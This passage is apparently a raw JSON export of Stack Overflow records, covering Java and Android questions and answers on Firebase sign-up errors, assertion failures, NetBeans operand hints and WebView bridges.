user.get(&quot;password&quot;));\r\n```","title":"Transform Map&lt;String, Object&gt; to Object using Java streams","body":"<p>I have a Map&lt;String, Object&gt; and I want to transform it to an Object.\nBasically the Map will contain the following:</p>\n<pre><code>username xyz\npassword abc\n</code></pre>\n<p>I want to transform it to a SimpleUser object which has two fields: username and password.\nThe current code looks like this, but I was wondering if I could do the object initialization inside the Stream:</p>\n<pre class=\"lang-java prettyprint-override\"><code>Map&lt;String, String&gt; user = adapter\n    .getSecret(&quot;abc&quot;)\n    .orElseThrow()\n    .entrySet().stream()\n    .collect(Collectors.toMap(Entry::getKey, v -&gt; v.getValue().toString()));\n\nreturn new SimpleUser(user.get(&quot;username&quot;), user.get(&quot;password&quot;));\n</code></pre>\n"},{"tags":["java","android","firebase","firebase-realtime-database"],"comments":[{"owner":{"account_id":2411568,"reputation":15860,"user_id":2106516,"accept_rate":91,"display_name":"tmarwen"},"score":1,"creation_date":1639566269,"post_id":70362398,"comment_id":124379567,"body_markdown":"And what is the error you are receiving?","body":"And what is the error you are receiving?"},{"owner":{"account_id":23644465,"reputation":23,"user_id":17674283,"display_name":"Matt M"},"score":0,"creation_date":1639567403,"post_id":70362398,"comment_id":124380017,"body_markdown":"@tmarwen it will post the toast &quot;Error - Please check username and password requirements&quot;","body":"@tmarwen it will post the toast &quot;Error - Please check username and password requirements&quot;"},{"owner":{"account_id":6819231,"reputation":132841,"user_id":5246885,"accept_rate":78,"display_name":"Alex Mamo"},"score":1,"creation_date":1639567595,"post_id":70362398,"comment_id":124380099,"body_markdown":"I&#39;m having a hard time understanding what the problem is.\nWhat exactly in this code doesn&#39;t work the way you expect?","body":"I&#39;m having a hard time understanding what the problem is. What exactly in this code doesn&#39;t work the way you expect?"},{"owner":{"account_id":23644465,"reputation":23,"user_id":17674283,"display_name":"Matt M"},"score":0,"creation_date":1639568159,"post_id":70362398,"comment_id":124380276,"body_markdown":"Apologies guys, I&#39;ll update my question to be more clear. When I&#39;m on the emulator, I go to the DriverLoginActivity, enter my details for signup, no matter what is entered I get the Please check username and password requirements. But they all match, email format &amp; password is over 6 digits. No matter what I do, I can&#39;t get it to register new users to the database","body":"Apologies guys, I&#39;ll update my question to be more clear. When I&#39;m on the emulator, I go to the DriverLoginActivity, enter my details for signup, no matter what is entered I get the Please check username and password requirements. But they all match, email format &amp; password is over 6 digits. No matter what I do, I can&#39;t get it to register new users to the database"},{"owner":{"account_id":6667055,"reputation":723,"user_id":7373144,"accept_rate":67,"display_name":"bradley101"},"score":0,"creation_date":1639582822,"post_id":70362398,"comment_id":124386740,"body_markdown":"Check if the firebase configuration json is correct.","body":"Check if the firebase configuration json is correct."}],"answers":[{"tags":[],"owner":{"account_id":72426,"reputation":573714,"user_id":209103,"accept_rate":73,"display_name":"Frank van Puffelen"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1639582684,"creation_date":1639582684,"answer_id":70366402,"question_id":70362398,"body_markdown":"When a task fails, it contains an exception with more information about what went wrong. You should *always* log that exception to learn the cause of the problem:\r\n\r\n```\r\npublic void onComplete(@NonNull Task&lt;AuthResult&gt; task) {\r\n    if(!task.isSuccessful())\r\n    {\r\n        Log.e(&quot;Auth&quot;, &quot;Creating user failed&quot;, task.getException()); // &#128072;\r\n        Toast.makeText(DriverLoginActivity.this, &quot;Error - Please check username and password requirements&quot;, Toast.LENGTH_SHORT).show();\r\n    }\r\n    else\r\n        ...\r\n```\r\n","title":"Writing data to Firebase database","body":"<p>When a task fails, it contains an exception with more information about what went wrong. You should <em>always</em> log that exception to learn the cause of the problem:</p>\n<pre><code>public void onComplete(@NonNull Task&lt;AuthResult&gt; task) {\n    if(!task.isSuccessful())\n    {\n        Log.e(&quot;Auth&quot;, &quot;Creating user failed&quot;, task.getException()); // 👈\n        Toast.makeText(DriverLoginActivity.this, &quot;Error - Please check username and password requirements&quot;, Toast.LENGTH_SHORT).show();\n    }\n    else\n        ...\n</code></pre>\n"}],"owner":{"account_id":23644465,"reputation":23,"user_id":17674283,"display_name":"Matt M"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":88,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"accepted_answer_id":70366402,"answer_count":1,"score":2,"last_activity_date":1639582684,"creation_date":1639565537,"question_id":70362398,"body_markdown":"Writing an uber clone through Android Studio, first time using Firebase. However, every time I click register user I get an error and nothing is entered.\r\n\r\nWhen I&#39;m on the emulator, I go to the DriverLoginActivity, enter my details for signup, no matter what is entered I get the Please check username and password requirements. But they all match, email format &amp; password is over 6 digits. No matter what I do, I can&#39;t get it to register new users to the database\r\n\r\nFirebase is connected, with dependancies all set up. JSON imported and correct SHA1 key. I&#39;ve tried it on emulator and on my phone so I know its not the internet. Cannot figure it out for the life of me. \r\n\r\nFirebase is set to Realtime database, with email and password authentification. Read and write rules are also set to true.\r\n\r\nANY insight would be hugely appreciated.\r\n\r\n**MainActivity.java**\r\n\r\n    public class MainActivity extends AppCompatActivity {\r\n    private Button mDriver, mCustomer;\r\n\r\n\r\n    @Override\r\n    protected void onCreate(Bundle savedInstanceState) {\r\n        super.onCreate(savedInstanceState);\r\n        setContentView(R.layout.activity_main);\r\n        getSupportActionBar().setTitle(&quot;Hippo&quot;);\r\n\r\n        //Call Buttons\r\n        mDriver = findViewById(R.id.driver);\r\n        mCustomer = findViewById(R.id.customer);\r\n\r\n       mDriver.setOnClickListener(new View.OnClickListener()\r\n        {\r\n            @Override\r\n            public void onClick(View v)\r\n            {\r\n                Intent intent = new Intent(MainActivity.this, DriverLoginActivity.class);\r\n                startActivity(intent);\r\n                finish();\r\n                return;\r\n            }\r\n        });\r\n\r\n        mCustomer.setOnClickListener(new View.OnClickListener()\r\n        {\r\n            @Override\r\n            public void onClick(View v)\r\n            {\r\n                Intent intent = new Intent(MainActivity.this, CustomerLoginActivity.class);\r\n                startActivity(intent);\r\n                finish();\r\n                return;\r\n            }\r\n        });\r\n\r\n\r\n\r\n\r\n\r\n    }\r\n}\r\n\r\n\r\n**DriverLoginActivity.java**\r\n\r\n \r\n\r\n    public class DriverLoginActivity extends AppCompatActivity {\r\n    private EditText mEmail, mPassword;\r\n    private Button mLogin, mRegister;\r\n\r\n    private FirebaseAuth mAuth;\r\n    private FirebaseAuth.AuthStateListener firebaseAuthListener;\r\n\r\n    @Override\r\n    protected void onCreate(Bundle savedInstanceState) {\r\n        FirebaseDatabase database = FirebaseDatabase.getInstance();\r\n\r\n\r\n\r\n        FirebaseDatabase.getInstance().getReference(&quot;Users&quot;).child(&quot;Drivers&quot;);;\r\n\r\n        mAuth = FirebaseAuth.getInstance();\r\n        super.onCreate(savedInstanceState);\r\n        setContentView(R.layout.activity_driver_login);\r\n        getSupportActionBar().setTitle(&quot;Hippo Drivers&quot;);\r\n        mAuth = FirebaseAuth.getInstance();\r\n        firebaseAuthListener = new FirebaseAuth.AuthStateListener() {\r\n            @Override\r\n            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {\r\n                FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();\r\n                if (user != null) {\r\n                    Intent intent = new Intent(DriverLoginActivity.this, MapActivity.class);\r\n                    startActivity(intent);\r\n                    finish();\r\n                    return;\r\n                }\r\n            }\r\n        };\r\n\r\n        mEmail = findViewById(R.id.email);\r\n        mPassword = findViewById(R.id.password);\r\n\r\n        mLogin = findViewById(R.id.login);\r\n        mRegister = findViewById(R.id.register);\r\n\r\n        mRegister.setOnClickListener(new View.OnClickListener() {\r\n            @Override\r\n            public void onClick(View view) {\r\n                final String email = mEmail.getText().toString();\r\n                final String password = mPassword.getText().toString();\r\n                Log.d(&quot;Done&quot;,&quot;Email and password to string&quot;);\r\n                mAuth.createUserWithEmailAndPassword(email, password).addOnCompleteListener(DriverLoginActivity.this, new OnCompleteListener&lt;AuthResult&gt;() {\r\n                    @Override\r\n                    public void onComplete(@NonNull Task&lt;AuthResult&gt; task) {\r\n                        if(!task.isSuccessful())\r\n                        {\r\n\r\n                            Toast.makeText(DriverLoginActivity.this, &quot;Error - Please check username and password requirements&quot;, Toast.LENGTH_SHORT).show();\r\n                        }\r\n                        else\r\n                        {\r\n                            String user_id = mAuth.getCurrentUser().getUid();\r\n                            DatabaseReference current_user_db = FirebaseDatabase.getInstance().getReference().child(&quot;Users&quot;).child(&quot;Drivers&quot;).child(user_id);\r\n                            current_user_db.setValue(true);\r\n                        }\r\n                    }\r\n                });\r\n            }\r\n        });\r\n\r\n        mRegister.setOnClickListener(new View.OnClickListener() {\r\n            @Override\r\n            public void onClick(View view) {\r\n                final String email = mEmail.getText().toString();\r\n                final String password = mPassword.getText().toString();\r\n                mAuth.signInWithEmailAndPassword(email, password).addOnCompleteListener(DriverLoginActivity.this, new OnCompleteListener&lt;AuthResult&gt;() {\r\n                    @Override\r\n                    public void onComplete(@NonNull Task&lt;AuthResult&gt; task) {\r\n                        if(!task.isSuccessful())\r\n                        {\r\n                            Toast.makeText(DriverLoginActivity.this, &quot;Error - Please check username and/or password&quot;, Toast.LENGTH_SHORT).show();\r\n                        }\r\n                        else\r\n                        {\r\n                            //REGISTERED\r\n                        }\r\n                    }\r\n\r\n                });\r\n            }\r\n        });\r\n    }\r\n\r\n    @Override\r\n    protected void onStart()\r\n    {\r\n        super.onStart();\r\n        mAuth.addAuthStateListener(firebaseAuthListener);\r\n        FirebaseUser currentUser = mAuth.getCurrentUser();\r\n\r\n    }\r\n\r\n    @Override\r\n    protected void onStop()\r\n    {\r\n        super.onStop();\r\n        mAuth.removeAuthStateListener(firebaseAuthListener);\r\n    }\r\n\r\n\r\n","title":"Writing data to Firebase database","body":"<p>Writing an uber clone through Android Studio, first time using Firebase. However, every time I click register user I get an error and nothing is entered.</p>\n<p>When I'm on the emulator, I go to the DriverLoginActivity, enter my details for signup, no matter what is entered I get the Please check username and password requirements. But they all match, email format &amp; password is over 6 digits. No matter what I do, I can't get it to register new users to the database</p>\n<p>Firebase is connected, with dependancies all set up. JSON imported and correct SHA1 key. I've tried it on emulator and on my phone so I know its not the internet. Cannot figure it out for the life of me.</p>\n<p>Firebase is set to Realtime database, with email and password authentification. Read and write rules are also set to true.</p>\n<p>ANY insight would be hugely appreciated.</p>\n<p><strong>MainActivity.java</strong></p>\n<pre><code>public class MainActivity extends AppCompatActivity {\nprivate Button mDriver, mCustomer;\n\n\n@Override\nprotected void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n    setContentView(R.layout.activity_main);\n    getSupportActionBar().setTitle(&quot;Hippo&quot;);\n\n    //Call Buttons\n    mDriver = findViewById(R.id.driver);\n    mCustomer = findViewById(R.id.customer);\n\n   mDriver.setOnClickListener(new View.OnClickListener()\n    {\n        @Override\n        public void onClick(View v)\n        {\n            Intent intent = new Intent(MainActivity.this, DriverLoginActivity.class);\n            startActivity(intent);\n            finish();\n            return;\n        }\n    });\n\n    mCustomer.setOnClickListener(new View.OnClickListener()\n    {\n        @Override\n        public void onClick(View v)\n        {\n            Intent intent = new Intent(MainActivity.this, CustomerLoginActivity.class);\n            startActivity(intent);\n            finish();\n            return;\n        }\n    });\n\n\n\n\n\n}\n</code></pre>\n<p>}</p>\n<p><strong>DriverLoginActivity.java</strong></p>\n<pre><code>public class DriverLoginActivity extends AppCompatActivity {\nprivate EditText mEmail, mPassword;\nprivate Button mLogin, mRegister;\n\nprivate FirebaseAuth mAuth;\nprivate FirebaseAuth.AuthStateListener firebaseAuthListener;\n\n@Override\nprotected void onCreate(Bundle savedInstanceState) {\n    FirebaseDatabase database = FirebaseDatabase.getInstance();\n\n\n\n    FirebaseDatabase.getInstance().getReference(&quot;Users&quot;).child(&quot;Drivers&quot;);;\n\n    mAuth = FirebaseAuth.getInstance();\n    super.onCreate(savedInstanceState);\n    setContentView(R.layout.activity_driver_login);\n    getSupportActionBar().setTitle(&quot;Hippo Drivers&quot;);\n    mAuth = FirebaseAuth.getInstance();\n    firebaseAuthListener = new FirebaseAuth.AuthStateListener() {\n        @Override\n        public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {\n            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();\n            if (user != null) {\n                Intent intent = new Intent(DriverLoginActivity.this, MapActivity.class);\n                startActivity(intent);\n                finish();\n                return;\n            }\n        }\n    };\n\n    mEmail = findViewById(R.id.email);\n    mPassword = findViewById(R.id.password);\n\n    mLogin = findViewById(R.id.login);\n    mRegister = findViewById(R.id.register);\n\n    mRegister.setOnClickListener(new View.OnClickListener() {\n        @Override\n        public void onClick(View view) {\n            final String email = mEmail.getText().toString();\n            final String password = mPassword.getText().toString();\n            Log.d(&quot;Done&quot;,&quot;Email and password to string&quot;);\n            mAuth.createUserWithEmailAndPassword(email, password).addOnCompleteListener(DriverLoginActivity.this, new OnCompleteListener&lt;AuthResult&gt;() {\n                @Override\n                public void onComplete(@NonNull Task&lt;AuthResult&gt; task) {\n                    if(!task.isSuccessful())\n                    {\n\n                        Toast.makeText(DriverLoginActivity.this, &quot;Error - Please check username and password requirements&quot;, Toast.LENGTH_SHORT).show();\n                    }\n                    else\n                    {\n                        String user_id = mAuth.getCurrentUser().getUid();\n                        DatabaseReference current_user_db = FirebaseDatabase.getInstance().getReference().child(&quot;Users&quot;).child(&quot;Drivers&quot;).child(user_id);\n                        current_user_db.setValue(true);\n                    }\n                }\n            });\n        }\n    });\n\n    mRegister.setOnClickListener(new View.OnClickListener() {\n        @Override\n        public void onClick(View view) {\n            final String email = mEmail.getText().toString();\n            final String password = mPassword.getText().toString();\n            mAuth.signInWithEmailAndPassword(email, password).addOnCompleteListener(DriverLoginActivity.this, new OnCompleteListener&lt;AuthResult&gt;() {\n                @Override\n                public void onComplete(@NonNull Task&lt;AuthResult&gt; task) {\n                    if(!task.isSuccessful())\n                    {\n                        Toast.makeText(DriverLoginActivity.this, &quot;Error - Please check username and/or password&quot;, Toast.LENGTH_SHORT).show();\n                    }\n                    else\n                    {\n                        //REGISTERED\n                    }\n                }\n\n            });\n        }\n    });\n}\n\n@Override\nprotected void onStart()\n{\n    super.onStart();\n    mAuth.addAuthStateListener(firebaseAuthListener);\n    FirebaseUser currentUser = mAuth.getCurrentUser();\n\n}\n\n@Override\nprotected void onStop()\n{\n    super.onStop();\n    mAuth.removeAuthStateListener(firebaseAuthListener);\n}\n</code></pre>\n"},{"tags":["java","runtime-error"],"comments":[{"owner":{"account_id":20240228,"reputation":496,"user_id":14844306,"display_name":"Ben Anderson"},"score":2,"creation_date":1639582168,"post_id":70366222,"comment_id":124386469,"body_markdown":"Probably wants `&gt;=` instead of `&gt;`. The AssertionError just means you got their challenge wrong its not an error being thrown by your code.","body":"Probably wants <code>&gt;=</code> instead of <code>&gt;</code>. The AssertionError just means you got their challenge wrong its not an error being thrown by your code."}],"answers":[{"tags":[],"owner":{"account_id":401843,"reputation":89788,"user_id":768644,"display_name":"rzwitserloot"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639582509,"creation_date":1639582509,"answer_id":70366365,"question_id":70366222,"body_markdown":"An `AssertionError` is thrown when you write an assertion:\r\n\r\n```\r\nvoid foo() {\r\n  int x = 5;\r\n  int y = 6;\r\n  assert x &gt; y;\r\n}\r\n```\r\n\r\nasserts are normally not evaluated; the idea is that an assert is __not__ used to verify inputs, solely to state truths, and they serve as documentation primarily. On runs while developing, you let them evaluate.\r\n\r\nThat you&#39;re getting them here is a bit odd; presumably the &#39;test framework&#39; that checks your `existsHigher` impl is written as e.g.:\r\n\r\n```\r\nvoid checkWork() {\r\n  assert ExistsANumberHigher.existsHigher(new int[] {4, 3, 3, 2, 2}, 4);\r\n}\r\n```\r\n\r\nIn ohter words, the testcode is broken or the question has a typo - that&#39;s my best guess. That they actually want &#39;higher or equal&#39;, so try `&gt;=` and see what happens. Or just talk to whomever made this thing, they messed up.\r\n","title":"No idea why I&#39;m getting an assertion error here","body":"<p>An <code>AssertionError</code> is thrown when you write an assertion:</p>\n<pre><code>void foo() {\n  int x = 5;\n  int y = 6;\n  assert x &gt; y;\n}\n</code></pre>\n<p>asserts are normally not evaluated; the idea is that an assert is <strong>not</strong> used to verify inputs, solely to state truths, and they serve as documentation primarily. On runs while developing, you let them evaluate.</p>\n<p>That you're getting them here is a bit odd; presumably the 'test framework' that checks your <code>existsHigher</code> impl is written as e.g.:</p>\n<pre><code>void checkWork() {\n  assert ExistsANumberHigher.existsHigher(new int[] {4, 3, 3, 2, 2}, 4);\n}\n</code></pre>\n<p>In ohter words, the testcode is broken or the question has a typo - that's my best guess. That they actually want 'higher or equal', so try <code>&gt;=</code> and see what happens. Or just talk to whomever made this thing, they messed up.</p>\n"}],"owner":{"account_id":23656492,"reputation":9,"user_id":17684702,"display_name":"CCleveland"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":668,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"answer_count":1,"score":0,"last_activity_date":1639582509,"creation_date":1639581958,"question_id":70366222,"body_markdown":"So, I&#39;m doing this exercise on edabit for fun, and I got an assertion error. The goal of the exercise is to check and see if there are any numbers in an array that are higher than a given number. Here is my code.\r\n```\r\npublic class ExistsANumberHigher {\r\n\tpublic static boolean existsHigher(int[] arr, int n) {\r\n\t\tboolean b = false;\r\n\t\tfor(int num : arr){\r\n\t\t\tif(num &gt; n){\r\n\t\t\t\tb = true;\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn b;\r\n\t}\r\n}\r\n```\r\nWhen given an array of [4, 3, 3, 3, 2, 2, 2], and a given number of 4, it throws an assertion error. I&#39;m not even sure what an assertion error is. Not looking for improvements to my code other than fixing this error btw. It&#39;s a 2-minute challenge. Thank you.","title":"No idea why I&#39;m getting an assertion error here","body":"<p>So, I'm doing this exercise on edabit for fun, and I got an assertion error. The goal of the exercise is to check and see if there are any numbers in an array that are higher than a given number. Here is my code.</p>\n<pre><code>public class ExistsANumberHigher {\n    public static boolean existsHigher(int[] arr, int n) {\n        boolean b = false;\n        for(int num : arr){\n            if(num &gt; n){\n                b = true;\n            }\n        }\n        return b;\n    }\n}\n</code></pre>\n<p>When given an array of [4, 3, 3, 3, 2, 2, 2], and a given number of 4, it throws an assertion error. I'm not even sure what an assertion error is. Not looking for improvements to my code other than fixing this error btw. It's a 2-minute challenge. Thank you.</p>\n"},{"tags":["java","netbeans","flip","operands"],"comments":[{"owner":{"account_id":2538485,"reputation":15111,"user_id":2204926,"accept_rate":96,"display_name":"Idos"},"score":0,"creation_date":1455700054,"post_id":35452063,"comment_id":58601048,"body_markdown":"Are you sure it is on that line? Can you show us a few lines up/down from that specific line?","body":"Are you sure it is on that line? Can you show us a few lines up/down from that specific line?"},{"owner":{"account_id":7832038,"reputation":101,"user_id":5921638,"display_name":"Lauren Stephen"},"score":0,"creation_date":1455700293,"post_id":35452063,"comment_id":58601210,"body_markdown":"Yes, I&#39;m fairly sure it&#39;s on that line. The suggestion only appears when I click directly on a mathematical operator.","body":"Yes, I&#39;m fairly sure it&#39;s on that line. The suggestion only appears when I click directly on a mathematical operator."},{"owner":{"account_id":7832038,"reputation":101,"user_id":5921638,"display_name":"Lauren Stephen"},"score":0,"creation_date":1455700700,"post_id":35452063,"comment_id":58601477,"body_markdown":"No, no change to the order of operands if the operator symbol is clicked. It will change them if I click on the warning and select &#39;flip operands&#39;.","body":"No, no change to the order of operands if the operator symbol is clicked. It will change them if I click on the warning and select &#39;flip operands&#39;."},{"owner":{"account_id":3223020,"reputation":1760,"user_id":2719960,"accept_rate":75,"display_name":"DonyorM"},"score":0,"creation_date":1455701025,"post_id":35452063,"comment_id":58601728,"body_markdown":"@Craig90 are you sure all of the variables are ints/doubles?","body":"@Craig90 are you sure all of the variables are ints/doubles?"},{"owner":{"account_id":7832038,"reputation":101,"user_id":5921638,"display_name":"Lauren Stephen"},"score":5,"creation_date":1455701474,"post_id":35452063,"comment_id":58602047,"body_markdown":"You know what, I&#39;m starting to think this is a Netbeans feature to give you the option of easily flipping two operands rather than having to retype them. I&#39;m reading the yellow lightbulb as a warning/suggestion, but it may just be giving me the option to do something rather than suggesting it.","body":"You know what, I&#39;m starting to think this is a Netbeans feature to give you the option of easily flipping two operands rather than having to retype them. I&#39;m reading the yellow lightbulb as a warning/suggestion, but it may just be giving me the option to do something rather than suggesting it."},{"owner":{"account_id":2535180,"reputation":710,"user_id":2202512,"accept_rate":100,"display_name":"anaxin"},"score":1,"creation_date":1455701670,"post_id":35452063,"comment_id":58602176,"body_markdown":"I think it&#39;s just a suggestion in case you want to quickly change them or for readability. You can disable it by pressing the &gt; to the right and disable.","body":"I think it&#39;s just a suggestion in case you want to quickly change them or for readability. You can disable it by pressing the &gt; to the right and disable."},{"owner":{"account_id":17912,"reputation":3052,"user_id":40570,"accept_rate":60,"display_name":"shabby"},"score":0,"creation_date":1464591548,"post_id":35452063,"comment_id":62531614,"body_markdown":"which netbeans version are you using, it seems to be a bug which was reported in version 7.4 and was fixed later, i dint have this issue in 8.x\nhttps://netbeans.org/bugzilla/show_bug.cgi?id=229738","body":"which netbeans version are you using, it seems to be a bug which was reported in version 7.4 and was fixed later, i dint have this issue in 8.x <a href=\"https://netbeans.org/bugzilla/show_bug.cgi?id=229738\" rel=\"nofollow noreferrer\">netbeans.org/bugzilla/show_bug.cgi?id=229738</a>"},{"owner":{"account_id":2690137,"reputation":133,"user_id":2323644,"display_name":"Leonardo Castro"},"score":2,"creation_date":1475155188,"post_id":35452063,"comment_id":66837279,"body_markdown":"@LaurenStephen You can answer your own question here. http://stackoverflow.com/help/self-answer","body":"@LaurenStephen You can answer your own question here. <a href=\"http://stackoverflow.com/help/self-answer\">stackoverflow.com/help/self-answer</a>"}],"answers":[{"tags":[],"owner":{"account_id":9977034,"reputation":390,"user_id":7381272,"display_name":"McKay G"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1500505273,"creation_date":1500505273,"answer_id":45202425,"question_id":35452063,"body_markdown":"Your thought that this is a Netbeans feature for quickly flipping the operands is correct.  This is one of the relatively few &quot;suggestions/actions&quot; available in Java Hints (http://wiki.netbeans.org/Java_Hints), as opposed to the more numerous &quot;hints/inspections&quot;.\r\n\r\nIn Netbeans 8.2 I have verified that when pressing Alt + Enter in the pennies line in your snippet, there is a menu option to &quot;Flip operands of &#39;%&#39; (may alter semantics)&#39;.  Actually, it may bring up multiple such menu options because there are multiple binary operators.  If you choose to flip the operands then the hint will remain, and you can flip them again, over and over, by the same means.\r\n\r\nApparently Netbeans is smart enough to at least be aware that flipping the operands for this type of operator could change the semantics (although it doesn&#39;t mention the behavior).  For &#39;==&#39; it doesn&#39;t carry that warning.","title":"Why is Netbeans suggesting I &quot;Flip operands of the binary operators&quot; in my Java code","body":"<p>Your thought that this is a Netbeans feature for quickly flipping the operands is correct.  This is one of the relatively few \"suggestions/actions\" available in Java Hints (<a href=\"http://wiki.netbeans.org/Java_Hints\" rel=\"nofollow noreferrer\">http://wiki.netbeans.org/Java_Hints</a>), as opposed to the more numerous \"hints/inspections\".</p>\n\n<p>In Netbeans 8.2 I have verified that when pressing Alt + Enter in the pennies line in your snippet, there is a menu option to \"Flip operands of '%' (may alter semantics)'.  Actually, it may bring up multiple such menu options because there are multiple binary operators.  If you choose to flip the operands then the hint will remain, and you can flip them again, over and over, by the same means.</p>\n\n<p>Apparently Netbeans is smart enough to at least be aware that flipping the operands for this type of operator could change the semantics (although it doesn't mention the behavior).  For '==' it doesn't carry that warning.</p>\n"},{"tags":[],"owner":{"account_id":1150912,"reputation":243,"user_id":1132655,"accept_rate":56,"display_name":"user1132655"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639582434,"creation_date":1639582434,"answer_id":70366345,"question_id":35452063,"body_markdown":"Had this issue also, and just today recognized that this is not a warning and not even a suggestion. The icon looks like a warning but actually it is a &quot;refactoring utility&quot; to for example flip operator or invert if without having to type, but choosing from actions in the menu opened when clicking the icon. The icon appears only when you click on a symbol for which such thing can be done. The icon is same as a warning icon, the only difference is that for warnings there is also a yellow underline and it is permanent. I would suggest Netbeans devs to change the icon, this really confused me for years :).","title":"Why is Netbeans suggesting I &quot;Flip operands of the binary operators&quot; in my Java code","body":"<p>Had this issue also, and just today recognized that this is not a warning and not even a suggestion. The icon looks like a warning but actually it is a &quot;refactoring utility&quot; to for example flip operator or invert if without having to type, but choosing from actions in the menu opened when clicking the icon. The icon appears only when you click on a symbol for which such thing can be done. The icon is same as a warning icon, the only difference is that for warnings there is also a yellow underline and it is permanent. I would suggest Netbeans devs to change the icon, this really confused me for years :).</p>\n"}],"owner":{"account_id":7832038,"reputation":101,"user_id":5921638,"display_name":"Lauren Stephen"},"comment_count":8,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":17446,"favorite_count":0,"down_vote_count":0,"up_vote_count":10,"answer_count":2,"score":10,"last_activity_date":1639582434,"creation_date":1455699821,"question_id":35452063,"body_markdown":"Netbeans frequently suggests that I &quot;flip operands of the binary operator&quot; when I&#39;m doing mathematical calculations. For example, in the following line of code:\r\n\r\n        change = 100 - price;\r\n\r\n        quarters = change / 25;\r\n        dimes = change % 25 / 10;\r\n        nickels = change % 25 % 10 / 5;\r\n        pennies = change % 25 % 10 % 5;\r\n\r\nNetbeans makes the suggestion for every mathematical symbol (so it does it three times in the &#39;pennies&#39; line.\r\n\r\nI&#39;m not sure I understand why it&#39;s making the suggestion. If I were to flip the operands while performing division I would get a different result (if &quot;flip&quot; means what I think it does, which is switch the order of the two values). Why does it suggest this?","title":"Why is Netbeans suggesting I &quot;Flip operands of the binary operators&quot; in my Java code","body":"<p>Netbeans frequently suggests that I \"flip operands of the binary operator\" when I'm doing mathematical calculations. For example, in the following line of code:</p>\n\n<pre><code>    change = 100 - price;\n\n    quarters = change / 25;\n    dimes = change % 25 / 10;\n    nickels = change % 25 % 10 / 5;\n    pennies = change % 25 % 10 % 5;\n</code></pre>\n\n<p>Netbeans makes the suggestion for every mathematical symbol (so it does it three times in the 'pennies' line.</p>\n\n<p>I'm not sure I understand why it's making the suggestion. If I were to flip the operands while performing division I would get a different result (if \"flip\" means what I think it does, which is switch the order of the two values). Why does it suggest this?</p>\n"},{"tags":["java","android","android-intent","bridge"],"comments":[{"owner":{"account_id":39846,"reputation":991143,"user_id":115145,"accept_rate":84,"display_name":"CommonsWare"},"score":1,"creation_date":1621197924,"post_id":67561407,"comment_id":119416988,"body_markdown":"You might consider editing your question to explain exactly what you mean by &quot;a bridge&quot;, and to show a [mcve] of how you are sending messages from JavaScript to Java. For example, if this is a `WebView` and you are using message channels for JS -&gt; Java, you can use the same thing for Java -&gt; JS: https://commonsware.com/blog/2017/01/23/replacing-addjavascriptinterface-html-message-channels.html","body":"You might consider editing your question to explain exactly what you mean by &quot;a bridge&quot;, and to show a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> of how you are sending messages from JavaScript to Java. For example, if this is a <code>WebView</code> and you are using message channels for JS -&gt; Java, you can use the same thing for Java -&gt; JS: <a href=\"https://commonsware.com/blog/2017/01/23/replacing-addjavascriptinterface-html-message-channels.html\" rel=\"nofollow noreferrer\">commonsware.com/blog/2017/01/23/&hellip;</a>"}],"answers":[{"tags":[],"owner":{"account_id":454120,"reputation":15970,"user_id":851491,"accept_rate":63,"display_name":"Khawar Raza"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1621198964,"creation_date":1621198964,"answer_id":67561551,"question_id":67561407,"body_markdown":"You can register an interface in Java with JavaScript through which JavaScript can call your native Java functions. Here you can find more details:\r\n\r\nhttps://developer.android.com/guide/webapps/webview#BindingJavaScript","title":"How to send a Bridge message from Java (Android) to JavaScript","body":"<p>You can register an interface in Java with JavaScript through which JavaScript can call your native Java functions. Here you can find more details:</p>\n<p><a href=\"https://developer.android.com/guide/webapps/webview#BindingJavaScript\" rel=\"nofollow noreferrer\">https://developer.android.com/guide/webapps/webview#BindingJavaScript</a></p>\n"},{"tags":[],"owner":{"account_id":1010958,"reputation":65,"user_id":1023540,"display_name":"And"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639582385,"creation_date":1639582385,"answer_id":70366338,"question_id":67561407,"body_markdown":"I made a working Android Studio Example\r\nsend data from Android java to WebView js and from WebView to Android\r\n\r\nhttps://stackoverflow.com/a/63539217/1023540\r\n\r\n (it was downloaded 191 times :-)\r\n","title":"How to send a Bridge message from Java (Android) to JavaScript","body":"<p>I made a working Android Studio Example\nsend data from Android java to WebView js and from WebView to Android</p>\n<p><a href=\"https://stackoverflow.com/a/63539217/1023540\">https://stackoverflow.com/a/63539217/1023540</a></p>\n<p>(it was downloaded 191 times :-)</p>\n"}],"owner":{"account_id":13839594,"reputation":865,"user_id":9990279,"display_name":"Filip"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":1077,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":2,"score":1,"last_activity_date":1639582385,"creation_date":1621197717,"question_id":67561407,"body_markdown":"I&#39;m developing a bridge and am able to send a message from JS to Java. But now, I want to send a message back to JS.\r\n\r\nI know about a way of doing it using `Activity.startActivityForResult(intent, request_code)` And then calling `webView.evaluateJavascript` but I don&#39;t want the intent part. \r\n\r\nIs there a way to create an empty intent (`new Intent()` doesn&#39;t work) or an alternative to this method?","title":"How to send a Bridge message from Java (Android) to JavaScript","body":"<p>I'm developing a bridge and am able to send a message from JS to Java. But now, I want to send a message back to JS.</p>\n<p>I know about a way of doing it using <code>Activity.startActivityForResult(intent, request_code)</code> And then 